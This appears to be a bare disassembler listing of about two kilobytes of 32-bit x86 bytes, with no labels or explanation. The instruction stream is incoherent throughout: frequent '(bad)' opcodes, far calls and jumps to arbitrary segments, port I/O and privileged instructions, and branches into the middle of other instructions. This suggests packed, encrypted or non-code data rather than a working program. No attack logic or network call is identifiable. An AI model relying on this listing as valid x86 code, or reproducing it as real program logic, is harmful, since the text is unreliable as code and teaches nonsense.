  417240:	fld    TBYTE PTR [ecx+0x2046688b]
  417246:	and    ch,BYTE PTR ds:0xde3856ee
  41724c:	add    edx,ebx
  41724e:	jecxz  0x4171f6
  417250:	mov    eax,0x75ebb69
  417255:	fst    DWORD PTR [edx]
  417257:	fnstenv [ebp+0x14fc50db]
  41725d:	cmc    
  41725e:	imul   edi,edx,0x55d2cd32
  417264:	and    esp,DWORD PTR [esi]
  417266:	(bad)  
  417267:	enter  0x556d,0xa9
  41726b:	mov    dl,BYTE PTR [ebp-0x5acbbb0]
  417271:	jmp    0x4172b2
  417273:	lahf   
  417274:	pushf  
  417275:	es mov ah,0xeb
  417278:	push   ds
  417279:	cmc    
  41727a:	add    DWORD PTR [edi-0x73941d58],edi
  417280:	int    0x89
  417282:	fstp   DWORD PTR [esi+0x1]
  417285:	pop    ds
  417286:	psubusb mm5,QWORD PTR [ebx-0x1c]
  41728a:	lea    esp,[eax+ebp*8-0x1c]
  41728e:	mov    eax,0xa9068950
  417293:	xlat   BYTE PTR ds:[ebx]
  417294:	xchg   BYTE PTR [edx],bh
  417296:	pusha  
  417297:	jge    0x417308
  417299:	lods   al,BYTE PTR ds:[esi]
  41729a:	adc    BYTE PTR [edx-0x4eeaeae],cl
  4172a0:	aam    0xb2
  4172a2:	inc    edi
  4172a3:	rol    DWORD PTR [edi-0x3],cl
  4172a6:	and    DWORD PTR [edi-0x1ada7df3],0xcf69a44c
  4172b0:	es ret 
  4172b2:	and    eax,DWORD PTR [ebx]
  4172b4:	jge    0x4172fa
  4172b6:	scas   al,BYTE PTR es:[edi]
  4172b7:	xor    DWORD PTR [ebx],ebx
  4172b9:	(bad)  
  4172ba:	fs jbe 0x417291
  4172bd:	lds    esp,FWORD PTR [esi+0x51a7c4c1]
  4172c3:	call   0x4518:0xc60de04e
  4172ca:	mov    bh,0xc6
  4172cc:	retf   
  4172cd:	xchg   ebp,eax
  4172ce:	lahf   
  4172cf:	and    BYTE PTR [ebx-0x5a],al
  4172d2:	imul   eax,edi,0x17775b80
  4172d8:	mov    ds:0xc7a808e7,eax
  4172dd:	xchg   ecx,eax
  4172de:	and    eax,0x43df32b9
  4172e3:	push   DWORD PTR [edx-0x1]
  4172e6:	sbb    al,0xa7
  4172e8:	jb     0x41728b
  4172ea:	push   ecx
  4172eb:	test   eax,0x3fa7ac5e
  4172f0:	imul   esi,DWORD PTR [esi-0x80],0xffffffe1
  4172f4:	cmp    eax,0x8aa2a877
  4172f9:	fdiv   QWORD PTR ss:[edi]
  4172fc:	xchg   ebx,eax
  4172fd:	shr    BYTE PTR [ecx-0x17],1
  417300:	in     al,0xae
  417302:	inc    ebx
  417303:	popa   
  417304:	sub    al,0x9c
  417306:	test   DWORD PTR [ebp+0x66315783],esp
  41730c:	mov    esp,0x62602c40
  417311:	lods   eax,DWORD PTR ds:[esi]
  417312:	inc    edi
  417313:	retf   
  417314:	hlt    
  417315:	jne    0x4172f2
  417317:	sbb    al,dl
  417319:	gs sbb al,0xbf
  41731c:	aas    
  41731d:	cmp    cl,ah
  41731f:	loop   0x4172cb
  417321:	fwait
  417322:	daa    
  417323:	pop    esi
  417324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417325:	lahf   
  417326:	inc    ecx
  417327:	outs   dx,DWORD PTR ds:[esi]
  417328:	stos   DWORD PTR es:[edi],eax
  417329:	addr16 (bad) 
  41732b:	test   al,0x4f
  41732d:	imul   BYTE PTR [esi+0x7f]
  417330:	xlat   BYTE PTR ds:[ebx]
  417331:	mov    edx,0xc81b3f2e
  417336:	mov    eax,ds:0x6be42a82
  41733b:	(bad)  
  41733d:	mov    ah,0x2d
  41733f:	cdq    
  417340:	dec    DWORD PTR [esi]
  417342:	lods   al,BYTE PTR ds:[esi]
  417343:	push   ebx
  417344:	out    0x2f,eax
  417346:	pop    ss
  417347:	fisub  DWORD PTR [edi-0x13]
  41734a:	push   ss
  41734b:	in     eax,0xc6
  41734d:	and    al,0x77
  41734f:	out    0x38,eax
  417351:	rol    bh,1
  417353:	adc    BYTE PTR [edi+0x6e],0x2
  417357:	dec    esi
  417358:	imul   esp,DWORD PTR [ebx+edi*4-0x66],0xf101b26
  417360:	inc    eax
  417361:	out    dx,al
  417362:	inc    eax
  417363:	sub    al,0xf0
  417365:	jbe    0x417301
  417367:	dec    edx
  417368:	call   0xdfca:0x5fc8f802
  41736f:	or     DWORD PTR [ecx],edi
  417371:	jp     0x417390
  417373:	ds dec ebp
  417375:	fwait
  417376:	dec    edx
  417377:	jne    0x41732e
  417379:	dec    ebx
  41737a:	inc    edx
  41737b:	xchg   edi,eax
  41737c:	out    dx,eax
  41737d:	(bad)  
  41737e:	sub    BYTE PTR ds:0x31c56992,ch
  417384:	into   
  417385:	popa   
  417386:	arpl   WORD PTR [ebp+0x6f9e0883],di
  41738c:	adc    DWORD PTR [ebx+0x4e],eax
  41738f:	add    eax,0x1ef13bcd
  417394:	jo     0x41740a
  417396:	add    eax,0xddb7b620
  41739b:	retf   
  41739c:	xchg   BYTE PTR [eax],dh
  41739e:	andnps xmm3,XMMWORD PTR [ecx+0x334cdb3f]
  4173a5:	je     0x417370
  4173a7:	push   edx
  4173a8:	jp     0x417425
  4173aa:	push   0xffffffe8
  4173ac:	push   ebx
  4173ad:	mov    ds:0xf9463264,al
  4173b2:	dec    edi
  4173b3:	adc    eax,0x46938ab3
  4173b8:	adc    bl,BYTE PTR [edx-0x64719ad2]
  4173be:	sub    al,0xff
  4173c0:	add    BYTE PTR [esi+0x47024ee],0x57
  4173c7:	stc    
  4173c8:	xor    DWORD PTR [ebx+eiz*1],eax
  4173cb:	(bad)  
  4173cc:	inc    esi
  4173cd:	xchg   edi,eax
  4173ce:	jno    0x417358
  4173d0:	(bad)  
  4173d1:	lea    esp,[ecx-0x790805e4]
  4173d7:	inc    eax
  4173d8:	test   al,0x12
  4173da:	popa   
  4173db:	jae    0x417367
  4173dd:	mov    ecx,0x97a55cc9
  4173e2:	std    
  4173e3:	call   0xe398:0xadb370bd
  4173ea:	(bad)  
  4173eb:	dec    ecx
  4173ed:	inc    esi
  4173ee:	(bad)  
  4173f0:	sbb    DWORD PTR [edx+0x51],edi
  4173f3:	push   es
  4173f4:	arpl   bx,di
  4173f6:	jp     0x41742d
  4173f8:	js     0x417455
  4173fa:	popa   
  4173fb:	xchg   esp,eax
  4173fc:	lea    ebx,[ebx+0x425c5eef]
  417402:	aad    0xd4
  417404:	dec    ebx
  417405:	(bad)  
  417406:	in     al,dx
  417407:	dec    eax
  417408:	mov    al,fs:0x92b52e36
  41740e:	fbstp  TBYTE PTR [ebp+0x2d]
  417411:	rcr    BYTE PTR [eax-0x3246f5f6],1
  417417:	jns    0x4173c7
  417419:	dec    ebp
  41741a:	fisubr DWORD PTR [eax+0x1b]
  41741d:	sub    al,0x30
  41741f:	adc    dh,al
  417421:	inc    ebx
  417422:	mov    ebx,esi
  417424:	push   0xffffff8b
  417426:	push   eax
  417427:	inc    edx
  417428:	popf   
  417429:	call   0x82f9:0xc8a00ac5
  417430:	jp     0x4173d9
  417432:	dec    esi
  417433:	xchg   esi,eax
  417434:	in     al,0xc9
  417436:	mov    esi,0x438810dd
  41743b:	mov    ebx,0x845799ca
  417440:	dec    esi
  417441:	add    edx,0x4e858b4
  417447:	xor    ebp,DWORD PTR [ecx-0x299aa698]
  41744d:	enter  0x626f,0x35
  417451:	mov    dl,0xdb
  417453:	call   0x4d8ab188
  417458:	repnz bound edx,QWORD PTR [edx+0x428cbacf]
  41745f:	mov    edx,ecx
  417461:	and    eax,DWORD PTR [eax]
  417463:	mov    BYTE PTR [edi+0x514e2d7c],al
  417469:	xor    bh,al
  41746b:	shl    esi,0x5b
  41746e:	xchg   al,cl
  417470:	gs (bad) 
  417472:	sub    cl,BYTE PTR [edi]
  417474:	mov    bh,0xc7
  417476:	mov    ds:0xdb8a54ec,al
  41747b:	call   0xd921:0xf4e534c6
  417482:	xchg   ecx,eax
  417483:	pop    ss
  417484:	fimul  WORD PTR [eax+0x3]
  417487:	or     BYTE PTR [esi],0x30
  41748a:	ins    DWORD PTR es:[edi],dx
  41748b:	popa   
  41748c:	popa   
  41748d:	xchg   ebp,eax
  41748e:	add    BYTE PTR [eax],al
  417490:	add    BYTE PTR [eax],al
  417492:	fisttp WORD PTR [ebp-0x66]
  417495:	mov    DWORD PTR [edx+0x305fdfdf],ebx
  41749b:	adc    al,0x61
  41749d:	retf   0x3154
  4174a0:	cdq    
  4174a1:	jg     0x4174d4
  4174a3:	repnz add BYTE PTR [eax],al
  4174a6:	hlt    
  4174a7:	add    al,0x0
  4174a9:	add    cl,bl
  4174ab:	je     0x417511
  4174ad:	mov    al,ds:0x11c0857f
  4174b2:	ja     0x41752b
  4174b4:	xor    dl,BYTE PTR [edi+0x1cca1c2d]
  4174ba:	adc    esp,DWORD PTR [esi+0x4c]
  4174bd:	dec    ecx
  4174be:	out    0xb3,al
  4174c0:	call   0xb27c:0x981facd8
  4174c7:	mov    ah,0x57
  4174c9:	push   cs
  4174ca:	lods   al,BYTE PTR ds:[esi]
  4174cb:	xchg   ebp,eax
  4174cc:	sub    DWORD PTR [ebx-0x50],0xffffff81
  4174d0:	mov    ecx,0x2d3e75d1
  4174d5:	adc    DWORD PTR [edx+edi*8],edx
  4174d8:	or     DWORD PTR [edi+0x7ac7382b],0x7b
  4174df:	pop    esi
  4174e0:	bnd ret 0x5ed2
  4174e4:	(bad)  
  4174e5:	sbb    bl,BYTE PTR [eax-0x1d03a135]
  4174eb:	add    eax,0xf5db92
  4174f0:	adc    ebx,DWORD PTR [eax]
  4174f2:	xchg   edx,eax
  4174f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174f4:	pop    eax
  4174f5:	lods   al,BYTE PTR ds:[esi]
  4174f6:	push   esp
  4174f7:	add    edx,DWORD PTR [edi+0x8]
  4174fa:	push   0x47
  4174fc:	sub    al,0xbe
  4174fe:	outs   dx,BYTE PTR ds:[esi]
  4174ff:	ss lahf 
  417501:	ins    DWORD PTR es:[edi],dx
  417502:	(bad)  
  417503:	lods   al,BYTE PTR ds:[esi]
  417504:	lahf   
  417505:	sub    BYTE PTR [ecx],0x85
  417508:	jp     0x4174c6
  41750a:	mov    ecx,0x84bded00
  41750f:	inc    esp
  417510:	iretw  
  417512:	jecxz  0x41752f
  417514:	loope  0x4174c1
  417516:	outs   dx,BYTE PTR ds:[esi]
  417517:	xlat   BYTE PTR ds:[ebx]
  417518:	scas   al,BYTE PTR es:[edi]
  417519:	ror    BYTE PTR [ecx+ecx*4],0x3
  41751d:	cli    
  41751e:	mov    al,0xc
  417520:	jbe    0x417511
  417522:	push   edx
  417523:	neg    DWORD PTR [edx-0x4b349da5]
  417529:	mov    eax,0x2b738050
  41752e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41752f:	push   edx
  417530:	and    DWORD PTR [edx-0x36],0x12701d81
  417537:	in     eax,0xd2
  417539:	rcr    edx,1
  41753b:	in     al,0x46
  41753d:	ret    0x14d
  417540:	inc    esi
  417541:	cmove  ecx,DWORD PTR [ecx-0x49]
  417545:	and    BYTE PTR [ecx+ebp*4],dh
  417548:	sub    edi,DWORD PTR [esi+0x34]
  41754b:	mov    esi,0x1c8bafdf
  417550:	add    dh,al
  417552:	add    al,BYTE PTR [eax]
  417554:	daa    
  417555:	jp     0x41756d
  417557:	loopne 0x417540
  417559:	inc    edi
  41755a:	aad    0x65
  41755c:	or     edi,DWORD PTR [eax+0x0]
  41755f:	cld    
  417560:	push   edx
  417561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417562:	and    DWORD PTR [ebp+0x5e6e9432],ebp
  417568:	outs   dx,BYTE PTR ds:[esi]
  417569:	mov    esp,0xefd955a2
  41756e:	mov    edx,0xb51b1574
  417573:	push   ebx
  417574:	push   es
  417575:	mov    esi,0x46ec0c05
  41757a:	std    
  41757b:	xchg   ebx,eax
  41757c:	arpl   WORD PTR [esi],bp
  41757e:	imul   eax
  417580:	pop    esp
  417581:	mov    BYTE PTR [edi+0x79df18eb],ch
  417587:	gs ins DWORD PTR es:[edi],dx
  417589:	repnz in eax,0x97
  41758c:	pop    esp
  41758d:	push   ebp
  41758e:	pop    ecx
  41758f:	pop    edx
  417590:	pop    ebx
  417591:	mov    ah,0x5e
  417593:	pop    ecx
  417594:	sar    BYTE PTR [esi],0x14
  417597:	ror    ch,1
  417599:	rcr    cl,1
  41759b:	stc    
  41759c:	fldenv [eax+esi*2+0x59]
  4175a0:	cmp    BYTE PTR [ebp+0x39663141],ch
  4175a6:	mov    edx,DWORD PTR [eax]
  4175a8:	inc    ecx
  4175a9:	repz icebp 
  4175ab:	outs   dx,BYTE PTR ds:[esi]
  4175ac:	scas   al,BYTE PTR es:[edi]
  4175ad:	xchg   bh,al
  4175af:	lods   al,BYTE PTR ds:[esi]
  4175b0:	pop    esi
  4175b1:	out    0xcb,eax
  4175b3:	jb     0x4175e8
  4175b5:	xchg   BYTE PTR [ecx+0x28b9e6d4],ch
  4175bb:	xlat   BYTE PTR ds:[ebx]
  4175bc:	pop    esp
  4175bd:	loopne 0x41755f
  4175bf:	stc    
  4175c0:	sbb    eax,0x5401421d
  4175c5:	pop    edx
  4175c6:	adc    ecx,DWORD PTR [eax-0x7c]
  4175c9:	test   ch,cl
  4175cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175cc:	fsub   st(0),st
  4175ce:	mov    esi,0x6de70548
  4175d3:	hlt    
  4175d4:	pop    ebp
  4175d5:	stc    
  4175d6:	and    DWORD PTR [eax],edi
  4175d8:	cmp    BYTE PTR [ecx+0x37204163],0x96
  4175df:	and    esi,edi
  4175e1:	scas   eax,DWORD PTR es:[edi]
  4175e2:	adc    esi,DWORD PTR [edx+ebx*1]
  4175e5:	jne    0x4175c8
  4175e7:	gs (bad) 
  4175e9:	xor    eax,0x10953e53
  4175ee:	cmc    
  4175ef:	add    bl,BYTE PTR [ebx+0x1795ee1c]
  4175f5:	mov    ecx,0xce8fdb41
  4175fa:	mov    ah,0x1e
  4175fc:	outs   dx,BYTE PTR ds:[esi]
  4175fd:	push   esi
  4175fe:	push   edi
  4175ff:	mov    al,0xec
  417601:	or     DWORD PTR [edx-0x7a],0xe2481904
  417608:	lods   al,BYTE PTR ds:[esi]
  417609:	mov    WORD PTR [edi+edx*1],?
  41760c:	aas    
  41760d:	in     al,dx
  41760e:	adc    edx,DWORD PTR [ebx+0x5a]
  417611:	sub    DWORD PTR [edx-0x1123cef2],ebp
  417617:	inc    eax
  417618:	(bad)  
  417619:	shl    BYTE PTR [edi-0x3535d346],0xa4
  417620:	jge    0x4175e1
  417622:	jae    0x41769a
  417624:	mov    al,ds:0x1e6d0af1
  417629:	in     eax,dx
  41762a:	cmp    cl,BYTE PTR [ecx*2-0x2b203da5]
  417631:	push   es
  417632:	jmp    0xf58f05c0
  417637:	cmp    al,0x45
  417639:	push   cs
  41763a:	or     ah,BYTE PTR [ebx]
  41763c:	cld    
  41763d:	mov    fs:0x103e85f8,eax
  417643:	push   ebp
  417644:	mov    bh,0xc8
  417646:	pop    edi
  417647:	jmp    0x4175d4
  417649:	xchg   edi,eax
  41764a:	pop    es
  41764b:	inc    esp
  41764c:	adc    eax,0x75d39062
  417651:	sbb    eax,0x945b38bb
  417656:	pusha  
  417657:	xchg   DWORD PTR [esi],edx
  417659:	lods   al,BYTE PTR ds:[esi]
  41765a:	ficomp WORD PTR [edx+0x47db286a]
  417660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417661:	cmp    eax,0xd2dc5e86
  417666:	stos   BYTE PTR es:[edi],al
  417667:	add    edi,ebx
  417669:	mov    dl,0x86
  41766b:	enter  0x2b59,0xcd
  41766f:	fwait
  417670:	mov    ebp,0x42b6566
  417675:	jne    0x4176eb
  417677:	jp     0x417618
  417679:	add    BYTE PTR [esi+ecx*1],cl
  41767c:	cli    
  41767d:	shr    BYTE PTR [edi],0x82
  417680:	pop    es
  417681:	addr16 inc esp
  417683:	aaa    
  417684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417685:	int3   
  417686:	(bad)  
  417687:	retf   0x2b1f
  41768a:	adc    ah,BYTE PTR [esi+edx*8]
  41768d:	fldenv [esi]
  41768f:	(bad)  
  417690:	je     0x41767b
  417692:	in     al,0x87
  417694:	aad    0x41
  417696:	mul    ah
  417698:	mov    dl,BYTE PTR [esi]
  41769a:	mov    BYTE PTR [edx+edi*2+0x63c12def],dh
  4176a1:	ds repz clc 
  4176a4:	mov    eax,DWORD PTR [edx+0x7e]
  4176a7:	fistp  QWORD PTR [edx-0x29]
  4176aa:	ficomp DWORD PTR [edx-0x1b]
  4176ad:	scas   al,BYTE PTR es:[edi]
  4176ae:	cmp    eax,DWORD PTR [eax-0x5b]
  4176b1:	dec    ecx
  4176b2:	inc    ebp
  4176b3:	jecxz  0x417700
  4176b5:	(bad)  
  4176b7:	push   edi
  4176b8:	sub    BYTE PTR [esi-0x1a6eef3d],ch
  4176be:	les    esp,FWORD PTR [ebp+0x661d2256]
  4176c4:	(bad)  
  4176c5:	sti    
  4176c6:	jae    0x417745
  4176c8:	dec    esi
  4176c9:	adc    eax,0xd23e4161
  4176ce:	cmp    DWORD PTR [eax+0x76],edi
  4176d1:	ins    BYTE PTR es:[edi],dx
  4176d2:	push   ss
  4176d3:	mov    ah,0x4c
  4176d5:	test   DWORD PTR [edx+eiz*4-0x5ebcff6d],0x215fdad3
  4176e0:	mov    ds:0xe80a1f80,eax
  4176e5:	pushf  
  4176e6:	mov    edx,0x8d1aed1b
  4176eb:	inc    edi
  4176ec:	pop    esi
  4176ed:	out    dx,eax
  4176ee:	xor    al,0x5e
  4176f0:	cmp    al,0x2a
  4176f2:	packsswb mm0,QWORD PTR [ebp-0xd8a4a59]
  4176f9:	in     al,0xb0
  4176fb:	mov    ah,0x6
  4176fd:	imul   DWORD PTR [esi+0x5a]
  417700:	or     ah,ah
  417702:	jmp    0x71ed:0xf906aff8
  417709:	push   0x63391fa0
  41770e:	sub    al,BYTE PTR [eax-0x44cb1292]
  417714:	adc    eax,0xa762055b
  417719:	je     0x41772e
  41771b:	cmp    eax,0x243eee67
  417720:	jge    0x417778
  417722:	dec    ebx
  417723:	ret    
  417724:	push   esp
  417725:	mov    ds:0x1305e31,eax
  41772a:	(bad)
  41772e:	dec    edi
  41772f:	sub    eax,0xec617b56
  417734:	icebp  
  417735:	or     DWORD PTR [esp+esi*1+0x66],ecx
  417739:	or     edx,DWORD PTR [ebp+0x44cdbf0f]
  41773f:	ss xchg esp,eax
  417741:	std    
  417742:	out    dx,eax
  417743:	pop    eax
  417744:	retf   0xdb7f
  417747:	push   ds
  417748:	pop    ss
  417749:	mov    eax,ds:0x85104c1c
  41774e:	sub    DWORD PTR [edx+0x7e78c20d],0x340828f3
  417758:	mov    DWORD PTR [eax+0x1ea81f70],eax
  41775e:	cmp    al,0xaa
  417760:	out    dx,eax
  417761:	cdq    
  417762:	jno    0x4176f7
  417764:	jmp    0xfe0076df
  417769:	retf   0x18bf
  41776c:	jl     0x41773a
  41776e:	and    eax,0xe8297645
  417773:	push   ds
  417774:	addr16 popa 
  417776:	mov    edx,0x4bc9dd2f
  41777b:	int    0x54
  41777d:	inc    edx
  41777e:	in     al,dx
  41777f:	jmp    0xd115ff0e
  417784:	mov    ecx,0x10a59e1c
  417789:	add    cl,ch
  41778b:	out    0xbd,eax
  41778d:	cli    
  41778e:	fistp  DWORD PTR [edi+0x24]
  417791:	push   edi
  417792:	ficom  DWORD PTR [ebp+0x63]
  417795:	push   ebp
  417796:	mov    ecx,es
  417798:	and    bl,BYTE PTR [esp+ebx*2-0x50]
  41779c:	inc    edx
  41779d:	push   ebp
  41779e:	nop
  41779f:	dec    ecx
  4177a0:	push   es
  4177a1:	and    al,BYTE PTR [esi-0x4099c4]
  4177a7:	pop    ebx
  4177a8:	out    0xcf,al
  4177aa:	(bad)  
  4177ab:	dec    ebp
  4177ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177ad:	scas   eax,DWORD PTR es:[edi]
  4177ae:	fldcw  WORD PTR [ecx-0x3]
  4177b1:	mov    ch,BYTE PTR [edx+eiz*4-0x1dd38dd6]
  4177b8:	mov    al,ds:0x46d948e5
  4177bd:	lods   al,BYTE PTR ds:[esi]
  4177be:	xchg   ebx,eax
  4177bf:	jle    0x417806
  4177c1:	add    al,0x7f
  4177c3:	xchg   DWORD PTR [edi+ebx*1],eax
  4177c6:	inc    esp
  4177c7:	into   
  4177c8:	mov    esi,0x3fcd2448
  4177cd:	sbb    eax,0xad9d124f
  4177d2:	ins    DWORD PTR es:[edi],dx
  4177d3:	int3   
  4177d4:	or     al,0x9a
  4177d6:	std    
  4177d7:	jne    0x4177ff
  4177d9:	adc    ch,BYTE PTR [edx+0x5e]
  4177dc:	iret   
  4177dd:	jle    0x4177cd
  4177df:	xchg   ebx,eax
  4177e0:	ins    BYTE PTR es:[edi],dx
  4177e1:	xlat   BYTE PTR ds:[ebx]
  4177e2:	fwait
  4177e3:	es (bad) 
  4177e5:	in     al,0x1f
  4177e7:	repnz popf 
  4177e9:	lods   eax,DWORD PTR ds:[esi]
  4177ea:	sti    
  4177eb:	bnd ja 0x417846
  4177ee:	in     eax,dx
  4177ef:	fcom   QWORD PTR [eax-0x14]
  4177f2:	mov    bl,0xa1
  4177f4:	xor    DWORD PTR [ecx-0x4c],edx
  4177f7:	cmp    dh,dh
  4177f9:	mov    dh,0x91
  4177fb:	ins    BYTE PTR es:[edi],dx
  4177fc:	fsub   DWORD PTR [edx+esi*1-0x1c759030]
  417803:	sub    dl,bh
  417805:	add    eax,0x815dde8c
  41780a:	adc    cl,ah
  41780c:	mov    eax,0xf4438100
  417811:	mov    edx,0x75f337ab
  417816:	xlat   BYTE PTR ds:[ebx]
  417817:	fwait
  417818:	push   ss
  417819:	xchg   ecx,eax
  41781a:	imul   edi,DWORD PTR [edi+0x2bf6d359],0x6239809f
  417824:	test   DWORD PTR [ecx],edx
  417826:	cmc    
  417827:	jmp    0xf480a6d8
  41782c:	ret    
  41782d:	lahf   
  41782e:	les    ebp,FWORD PTR [edx+edi*8-0xd]
  417832:	out    dx,eax
  417833:	hlt    
  417834:	sbb    eax,0xe54fcdae
  417839:	mov    edx,0x21beac1b
  41783e:	dec    edx
  41783f:	push   ebp
  417840:	lea    edx,[edx+0x295e2781]
  417846:	retf   0x9873
  417849:	xchg   edi,eax
  41784a:	sar    DWORD PTR [edx-0x18fcb303],0x34
  417851:	cmp    esp,DWORD PTR ds:0x95a0db8a
  417857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417858:	mov    eax,ds:0xbfea7d0
  41785d:	push   edi
  41785e:	fwait
  41785f:	bound  edx,QWORD PTR [edx+0x74]
  417862:	cwde   
  417863:	sti    
  417864:	arpl   WORD PTR [ebx-0x7d2ca1b0],bx
  41786a:	mov    bl,0x53
  41786c:	bound  ecx,QWORD PTR [ebp-0x5d]
  41786f:	and    al,bl
  417871:	mov    WORD PTR [esi+esi*8+0x74aa60c5],ss
  417878:	or     ch,bh
  41787a:	fsubrp st(5),st
  41787c:	loope  0x41788e
  41787e:	or     dh,BYTE PTR [ebp-0x3]
  417881:	adc    eax,0x885d89d0
  417886:	int3   
  417887:	dec    ebx
  417888:	idiv   DWORD PTR [edi-0x6c]
  41788b:	adc    eax,0x65e411b1
  417890:	xor    DWORD PTR [edi-0x55],0x55ca81ce
  417897:	int    0xe3
  417899:	cmp    edx,DWORD PTR [edi]
  41789b:	outs   dx,DWORD PTR ds:[esi]
  41789c:	inc    esp
  41789d:	or     bl,BYTE PTR [ebx+0x7c]
  4178a0:	mov    esp,0x65817de1
  4178a5:	gs retf 
  4178a7:	push   eax
  4178a8:	test   eax,0xa12f0e6
  4178ad:	enter  0xed43,0xe7
  4178b1:	test   eax,0x2fe79d7e
  4178b6:	mov    al,0x65
  4178b8:	frstor [eiz*4-0x384b6df7]
  4178bf:	mov    esi,0x308a3683
  4178c4:	pop    ss
  4178c5:	dec    edx
  4178c6:	mov    eax,ds:0xadfc8800
  4178cb:	inc    esi
  4178cc:	popa   
  4178cd:	jae    0x417864
  4178cf:	ret    
  4178d0:	jae    0x4178af
  4178d2:	loope  0x41793b
  4178d4:	pop    eax
  4178d5:	and    DWORD PTR [eax+0x68],0x6ee26616
  4178dc:	mov    ah,0x47
  4178de:	in     eax,0x47
  4178e0:	fist   WORD PTR [eax-0x2f30e7ab]
  4178e6:	repnz inc edi
  4178e8:	dec    esp
  4178e9:	mov    esp,0xc7234ab7
  4178ee:	mov    bh,0x84
  4178f0:	push   ds
  4178f1:	mov    cl,0xa1
  4178f3:	ror    bh,1
  4178f5:	adc    ch,BYTE PTR ds:0x97ef046d
  4178fb:	js     0x41792c
  4178fd:	cmp    dl,bl
  4178ff:	daa    
  417900:	rcl    DWORD PTR [esi+0x2ff73d74],cl
  417906:	pop    edi
  417907:	out    dx,al
  417908:	xchg   ebx,eax
  417909:	add    eax,0x4f063daf
  41790e:	jae    0x4178ba
  417910:	loop   0x41793e
  417912:	addr16 add bh,ch
  417915:	pop    edx
  417916:	mov    al,ds:0x3948d500
  41791b:	mov    ebx,0x86ad060
  417920:	mov    edx,DWORD PTR [eax]
  417922:	or     eax,0x752b62be
  417927:	push   ebx
  417928:	stos   BYTE PTR es:[edi],al
  417929:	out    dx,eax
  41792a:	outs   dx,DWORD PTR ds:[esi]
  41792b:	div    BYTE PTR [eax+0xc]
  41792e:	loope  0x417952
  417930:	popa   
  417931:	push   esp
  417932:	or     DWORD PTR ds:0xe1d1da57,edi
  417938:	out    dx,al
  417939:	fimul  DWORD PTR [ebp+0x42faeb32]
  41793f:	or     DWORD PTR [eax+0x46],0x1b
  417943:	push   es
  417944:	js     0x417987
  417946:	pop    eax
  417947:	js     0x4179c3
  417949:	loope  0x417977
  41794b:	jg     0x4179b7
  41794d:	in     eax,dx
  41794e:	dec    edi
  41794f:	ror    DWORD PTR [edx-0x7],cl
  417952:	fisubr WORD PTR [edi-0x11]
  417955:	test   DWORD PTR [ebx],edi
  417957:	sbb    al,0x51
  417959:	mov    es,WORD PTR ds:0xe4d7c1f4
  41795f:	shr    ebx,0xfe
  417962:	xchg   edx,eax
  417963:	icebp  
  417964:	mov    bh,0xb1
  417966:	test   BYTE PTR [ecx],cl
  417968:	pop    ds
  417969:	and    ch,ch
  41796b:	outs   dx,DWORD PTR ds:[esi]
  41796c:	stos   DWORD PTR es:[edi],eax
  41796d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41796e:	xor    edi,esi
  417970:	pusha  
  417971:	pop    edi
  417972:	fcom   DWORD PTR [ecx+eiz*4-0x3773867d]
  417979:	bound  esp,QWORD PTR [edx-0x1431c90a]
  41797f:	and    DWORD PTR [ecx-0x4],ebp
  417982:	cmp    dh,BYTE PTR [edx]
  417984:	cld    
  417985:	xchg   edi,eax
  417986:	mov    esp,edi
  417988:	or     eax,0xe19740f8
  41798d:	mov    al,0x9a
  41798f:	sub    DWORD PTR [ebx+0x2af518b2],ebx
  417995:	mov    ds:0x2e190599,al
  41799a:	pop    ss
  41799b:	repnz cmc 
  41799d:	dec    ebp
  41799e:	add    BYTE PTR [eax],al
  4179a0:	add    BYTE PTR [eax],al
  4179a2:	es mov ah,0x71
  4179a5:	jno    0x41799a
  4179a7:	cmc    
  4179a8:	div    DWORD PTR es:[edx+0x8]
  4179ac:	mov    eax,ds:0xd839c975
  4179b1:	pop    edi
  4179b2:	and    eax,0xf40000f7
  4179b7:	add    al,0x0
  4179b9:	add    ah,dl
  4179bb:	cdq    
  4179bc:	(bad)  
  4179bd:	sbb    eax,DWORD PTR [ebp+0x15]
  4179c0:	sub    edi,DWORD PTR [ebx]
  4179c2:	mov    ebp,ecx
  4179c4:	and    al,0x6c
  4179c6:	jnp    0x417994
  4179c8:	int    0x30
  4179ca:	mov    cl,0x1e
  4179cc:	outs   dx,BYTE PTR ds:[esi]
  4179cd:	mov    ah,al
  4179cf:	xchg   ebp,eax
  4179d0:	repz pop DWORD PTR [esi]
  4179d3:	aaa    
  4179d4:	push   ebx
  4179d5:	pop    edi
  4179d6:	push   es
  4179d7:	sar    BYTE PTR [ebp-0x16f8c7e2],1
  4179dd:	cdq    
  4179de:	ins    DWORD PTR es:[edi],dx
  4179df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179e0:	xlat   BYTE PTR ds:[ebx]
  4179e1:	pop    ss
  4179e2:	mov    bh,0x81
  4179e4:	xchg   DWORD PTR [ecx+ecx*2-0x2a],ebx
  4179e8:	adc    ch,BYTE PTR [edx]
  4179ea:	dec    eax
  4179eb:	sub    ebx,ebp
  4179ed:	ins    BYTE PTR es:[edi],dx
  4179ee:	dec    edi
  4179ef:	ins    BYTE PTR es:[edi],dx
  4179f0:	sti    
  4179f1:	int3   
  4179f2:	in     al,dx
  4179f3:	nop
  4179f4:	push   ds
  4179f5:	fadd   st(5),st
  4179f7:	inc    edx
  4179f8:	rcl    ebp,cl
  4179fa:	or     DWORD PTR [ebx-0x3e8094b1],ebx
  417a00:	adc    ebx,esp
  417a02:	dec    ebp
  417a03:	push   edi
  417a04:	jmp    0x391a:0x159635d1
  417a0b:	test   BYTE PTR [eax+0xf],0xae
  417a0f:	push   eax
  417a10:	nop
  417a11:	retf   0x6d41
  417a14:	jle    0x417a1e
  417a16:	inc    ebp
  417a17:	scas   al,BYTE PTR es:[edi]
  417a18:	in     eax,0x1
  417a1a:	jae    0x4179d5
  417a1c:	mov    esp,0xe2198567
  417a21:	push   edx
  417a22:	clc    
  417a23:	hlt    
  417a24:	jo     0x417a2b
